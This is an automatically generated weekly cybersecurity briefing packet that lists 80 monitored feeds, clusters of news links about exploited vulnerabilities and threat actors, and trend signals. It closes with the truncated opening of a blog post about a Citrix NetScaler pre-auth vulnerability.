# PHANTOMSignal Briefing Packet

- Generated: 2026-08-18T22:30:26.390335+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 74
- Total items in window: 343
- Total clusters raw: 156
- Total clusters in packet: 68
- Dropped low score: 88
- Dropped overflow: 0

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 2
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 3
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 4
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 16
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 9
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 8
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 7
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 3
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 21
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 18
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 7
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 45
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 27
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 19
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 25
  - In window count: 25
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### Apple iOS/macOS active exploitation
- Anchor signal: Apple iOS/macOS
- Theme key: apple-ios-macos
- Cluster count: 5
- Article count: 12
- Cohesion: 0.201
- Shared strong signals: Apple iOS/macOS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, data_breach, zero_day, ddos, ransomware_extortion
  - affected_industries: financial_services, government
  - affected_products: Apple iOS/macOS, Anthropic/Claude, Azure
  - cve_ids: CVE-2026-65400, CVE-2026-53413
  - urgency_signals: actively_exploited, zero_day, poc_available
- Cluster IDs: 918adf4913, cb8fdf38e7, a50e916d10, 7e142768f0, 63d69c8e14
- Links:
  - https://thehackernews.com/2026/08/apple-macos-screen-sharing-flaw.html
  - https://isc.sans.edu/diary/rss/33254
  - https://www.huntress.com/blog/fake-claude-macsync
  - https://www.securityweek.com/dozens-of-webkit-vulnerabilities-patched-with-fresh-macos-ios-security-updates/
  - https://risky.biz/RBNEWS600/
  - https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
  - https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/
  - https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
  - https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/

### WordPress vulnerability activity
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 4
- Article count: 7
- Cohesion: 0.229
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: WordPress, OpenAI/ChatGPT
  - urgency_signals: preauth_unauth
- Cluster IDs: a7b2f82e67, ad3b948659, 8a66834bf6, b7b068c390
- Links:
  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - https://www.securityweek.com/300000-wordpress-sites-potentially-exposed-to-hacking-due-to-form-plugin-flaw/
  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - https://www.exploit-db.com/exploits/52642
  - https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
  - https://tldrsec.com/p/tldr-sec-341

### zero day targeting Microsoft Defender
- Anchor signal: Microsoft Defender
- Theme key: microsoft-defender
- Cluster count: 4
- Article count: 4
- Cohesion: 0.238
- Shared strong signals: Microsoft Defender
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, vulnerability_disclosure
  - affected_products: Microsoft Defender, Microsoft Windows
  - cve_ids: CVE-2026-50656
  - urgency_signals: zero_day, poc_available
- Cluster IDs: 21cbe0b5fa, dcf9212f8f, 8fb5179107, eb60a4b1a5
- Links:
  - https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
  - https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html
  - https://www.huntress.com/blog/akira-hits-safe-mode-ransomware-rebooting-around-edr

### zero day targeting Microsoft Windows
- Anchor signal: Microsoft Windows
- Theme key: microsoft-windows
- Cluster count: 3
- Article count: 3
- Cohesion: 0.33
- Shared strong signals: Microsoft Windows
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, vulnerability_disclosure
  - affected_products: Microsoft Windows, Microsoft Defender
  - cve_ids: CVE-2026-50656
  - urgency_signals: zero_day, poc_available
- Cluster IDs: 46d0bf1827, dcf9212f8f, 8fb5179107
- Links:
  - https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/
  - https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - https://thehackernews.com/2026/08/shieldbreak-zero-day-poc-claims.html

### Microsoft SharePoint active exploitation
- Anchor signal: Microsoft SharePoint
- Theme key: microsoft-sharepoint
- Cluster count: 3
- Article count: 4
- Cohesion: 0.2
- Shared strong signals: Microsoft SharePoint
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, active_exploitation
  - affected_industries: government
  - affected_products: Microsoft SharePoint
  - cve_ids: CVE-2026-45659
  - urgency_signals: actively_exploited
- Cluster IDs: 46d0bf1827, 7e142768f0, 324eddbb3a
- Links:
  - https://www.bleepingcomputer.com/news/security/cisa-windows-task-host-flaw-now-exploited-by-ransomware-gangs/
  - https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - https://thehackernews.com/2026/08/attackers-exploit-sharepoint.html

### Linux kernel vulnerability activity
- Anchor signal: Linux kernel
- Theme key: linux-kernel
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: Linux kernel
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Linux kernel
- Cluster IDs: a7b2f82e67, d8fada4bb9
- Links:
  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - https://www.securityweek.com/300000-wordpress-sites-potentially-exposed-to-hacking-due-to-form-plugin-flaw/
  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - https://www.welivesecurity.com/en/business-security/black-hat-usa-2026-vulnerability-discovery-decline-ai-era/

### Cisco vulnerability activity
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 2
- Article count: 3
- Cohesion: 0.273
- Shared strong signals: Cisco
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Cisco
- Cluster IDs: 496f8b853a, 452d902ac4
- Links:
  - https://thehackernews.com/2026/08/cisco-asa-and-ftd-flaw-exploited-in.html
  - https://blog.talosintelligence.com/dissecting-the-jwr-phishing-framework/
  - https://blog.talosintelligence.com/curiouser-and-curiouser/

### SolarWinds vulnerability activity
- Anchor signal: SolarWinds
- Theme key: solarwinds
- Cluster count: 2
- Article count: 4
- Cohesion: 0.333
- Shared strong signals: SolarWinds
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: SolarWinds
- Cluster IDs: 6c4f057b27, fb556ca51b
- Links:
  - https://aws.amazon.com/blogs/security/security-hub-extended-adds-supply-chain-security-as-its-tenth-category/
  - https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - https://www.bleepingcomputer.com/news/security/clop-created-custom-web-shell-for-windchill-data-theft-attacks/

### ransomware extortion targeting Android
- Anchor signal: Android
- Theme key: android
- Cluster count: 2
- Article count: 2
- Cohesion: 0.545
- Shared strong signals: Android
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion
  - affected_industries: financial_services
  - affected_products: Android, OpenAI/ChatGPT
- Cluster IDs: 8a66834bf6, 2a12c51464
- Links:
  - https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/
  - https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/

### SonicWall vulnerability activity
- Anchor signal: SonicWall
- Theme key: sonicwall
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: SonicWall
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: SonicWall
- Cluster IDs: a7b2f82e67, eb60a4b1a5
- Links:
  - https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - https://www.securityweek.com/300000-wordpress-sites-potentially-exposed-to-hacking-due-to-form-plugin-flaw/
  - https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - https://www.huntress.com/blog/akira-hits-safe-mode-ransomware-rebooting-around-edr

### apt espionage targeting UNC5174
- Anchor signal: UNC5174
- Theme key: unc5174
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: UNC5174
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: apt_espionage, web_shell_backdoor
  - actor_attribution: UNC5174
- Cluster IDs: a50e916d10, 4535ef9ae8
- Links:
  - https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
  - https://thehackernews.com/2026/08/attackers-exploit-vmware-vcenter.html
  - https://www.darkreading.com/vulnerabilities-threats/global-threat-campaign-critical-vmware-vcenter-flaw

### GitLab vulnerability activity
- Anchor signal: GitLab
- Theme key: gitlab
- Cluster count: 2
- Article count: 5
- Cohesion: 0.2
- Shared strong signals: GitLab
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: GitLab
- Cluster IDs: 87a0c02b73, 63d69c8e14
- Links:
  - https://www.helpnetsecurity.com/2026/08/18/gitlab-critical-code-injection-flaw-cve-2026-19478/
  - https://www.securityweek.com/gitlab-patches-critical-code-injection-vulnerability/
  - https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges
  - https://thehackernews.com/2026/08/critical-gitlab-graphql-flaw-could-let.html
  - https://www.securityweek.com/heights-finance-data-breach-impacts-at-least-1-2-million-individuals/

## Forward signals

### Novelty
- Novel cves: 0
- Novel actors: 0
- Novel products: 0

### Velocity bursts (0)

### Leading edge (2)
- **Apple macOS Screen Sharing Flaw Exploited on Internet-Exposed Macs to Install Monero Miner**
  - Cluster: 918adf4913
  - Lead hours: 87.8
  - First source: Risky Business News
  - Later Tier 1 source: SANS Internet Storm Center
  - Shared signals: Anthropic/Claude, Apple iOS/macOS, CVE-2026-43760, CVE-2026-43777, CVE-2026-43779, CVE-2026-65400, GitHub
- **From Patch Tuesday to Pentest Wednesday®: How a Major Transportation Company Turned AWS Attack Paths Into Action**
  - Cluster: 6a4c525838
  - Lead hours: 7.4
  - First source: Schneier on Security
  - Later Tier 1 source: Horizon3 Attack Research
  - Shared signals: AWS

### Convergence (15)
- Pair: CVE-2026-8452 + Citrix (cluster 0e9ca139ce, first observation: True)
- Pair: CVE-2026-8452 + OpenAI/ChatGPT (cluster 0e9ca139ce, first observation: True)
- Pair: CVE-2026-15748 + Linux kernel (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15748 + SonicWall (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15748 + WordPress (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15826 + Linux kernel (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15826 + SonicWall (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-15826 + WordPress (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-46300 + SonicWall (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-46300 + WordPress (cluster a7b2f82e67, first observation: True)
- Pair: CVE-2026-20349 + Cisco (cluster 496f8b853a, first observation: True)
- Pair: CVE-2026-43760 + Anthropic/Claude (cluster 918adf4913, first observation: True)
- Pair: CVE-2026-43760 + Apple iOS/macOS (cluster 918adf4913, first observation: True)
- Pair: CVE-2026-43760 + GitHub (cluster 918adf4913, first observation: True)
- Pair: CVE-2026-43777 + Anthropic/Claude (cluster 918adf4913, first observation: True)

### Drift (5)
- **Medusa** (cluster c7e8884f67)
  - New industries: healthcare
  - New products: (none)
  - Prior top industries: critical_infrastructure, education, government
  - Prior top products: Ivanti, SonicWall
- **UNC5174** (cluster a50e916d10)
  - New industries: (none)
  - New products: Azure
  - Prior top industries: education, government, telecommunications
  - Prior top products: Anthropic/Claude, Apple iOS/macOS, VMware
- **UNC5221** (cluster a50e916d10)
  - New industries: (none)
  - New products: Apple iOS/macOS, Azure
  - Prior top industries: critical_infrastructure, legal_professional, telecommunications
  - Prior top products: Anthropic/Claude, Google Cloud, Microsoft 365
- **Kimsuky** (cluster 7e142768f0)
  - New industries: healthcare
  - New products: (none)
  - Prior top industries: critical_infrastructure, financial_services, government
  - Prior top products: Apple iOS/macOS, Microsoft 365, Microsoft SharePoint
- **ShinyHunters** (cluster 03f13c7bab)
  - New industries: (none)
  - New products: OpenAI/ChatGPT
  - Prior top industries: education, financial_services, government
  - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 11, cluster 03f13c7bab)
- cve_ids: CVE-2026-45659 (weeks observed: 7, cluster 46d0bf1827)
- actor_attribution: Cl0p (weeks observed: 7, cluster fb556ca51b)
- cve_ids: CVE-2026-50656 (weeks observed: 5, cluster dcf9212f8f)
- cve_ids: CVE-2026-50522 (weeks observed: 5, cluster 324eddbb3a)
- actor_attribution: Mustang Panda (weeks observed: 4, cluster 21cbe0b5fa)
- cve_ids: CVE-2026-56164 (weeks observed: 4, cluster 324eddbb3a)
- actor_attribution: Lazarus (weeks observed: 4, cluster 22bf2708a0)
- cve_ids: CVE-2026-59310 (weeks observed: 4, cluster 4535ef9ae8)
- cve_ids: CVE-2026-18556 (weeks observed: 3, cluster 67b968df05)
- cve_ids: CVE-2026-18577 (weeks observed: 3, cluster 67b968df05)
- cve_ids: CVE-2026-46300 (weeks observed: 3, cluster a7b2f82e67)
- actor_attribution: Kimsuky (weeks observed: 3, cluster 7e142768f0)
- cve_ids: CVE-2026-58644 (weeks observed: 3, cluster 324eddbb3a)
- cve_ids: CVE-2026-59309 (weeks observed: 3, cluster 4535ef9ae8)

### Tier inversion (4)
- **🎥 Operation CameraSwarm: over 14,000 Dahua cameras compromised across Ukraine and Russia**
  - Cluster: 2faaf824a1
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2021-33044, CVE-2024-39943, CVE-2025-31702
- **CVE-2026-33696: From a Schema Name to RCE in n8n**
  - Cluster: 7029814c59
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-33696
- **CVE-2026-6837: Root Command Injection Affecting 18 Zyxel Access Point Models with full firmware emulation guide**
  - Cluster: 155be52ad5
  - Primary source: Reddit r/cybersecurity
  - Strong signals: CVE-2026-6837
- **From AKS node root vulnerability to Microsoft Copilot hijack (CVE-2026-32193)**
  - Cluster: 4405003146
  - Primary source: Reddit r/netsec
  - Strong signals: CVE-2026-32193

## Clusters

### Cluster 0e9ca139ce — score 44

- Title: You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?))
- Source: watchTowr Labs (offensive_vulnerability_research)
- Published: 2026-08-14T07:08:20+00:00
- Link: https://labs.watchtowr.com/youre-back-in-the-room-citrix-netscaler-pre-auth-rce-cve-2026-8452/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-8452, Citrix

#### Cluster taxonomy (union across members)
- affected_products: Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-8452
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_5_chatter

#### Primary article taxonomy
- affected_products: Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-8452
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Suddenly, you’re in a room. You look around - oh, you’re surrounded by other new starters at your new job. Yes, it’s Monday, and you’re being onboarded. You know the drill - it’s the typical enterprise “please don’t be
```

#### Full body

```
Suddenly, you’re in a room. You look around - oh, you’re surrounded by other new starters at your new job. Yes, it’s Monday, and you’re being onboarded. You know the drill - it’s the typical enterprise “please don’t be a bad person or we may have to fire you” speech. But, you know what’s coming soon. It’s your favorite part of the onboarding process when you’ve started a new role. It begins! The password policy requirements. You straighten your tie, because sure as heck, your SSLVPN credentials will not be the starting point for this organization. Not this time. Not again. You swore to yourself that you’d use a symbol this time. Wait, did they just say NetScalers? The world freezes around you. How are you back in the hellscape? You panic - what does a symbol matter in comparison to the traumatic nightmares you relive every day? You realize the truth - nobody cares whether your password has a symbol or not. It’s already over for you. Welcome back to another watchTowr Labs blog post. It’s been three years since the last publicly documented NetScaler RCE writeup. ChatGPT tells us that today we’re changing that. Exciting. In this post, we’re going to walk through a vulnerability that was resolved as part of a recent NetScaler ADC and NetScaler Gateway Security Bulletin . As part of this bulletin, Citrix subtly? silently? loudly? patched a Heap Overflow vulnerability that 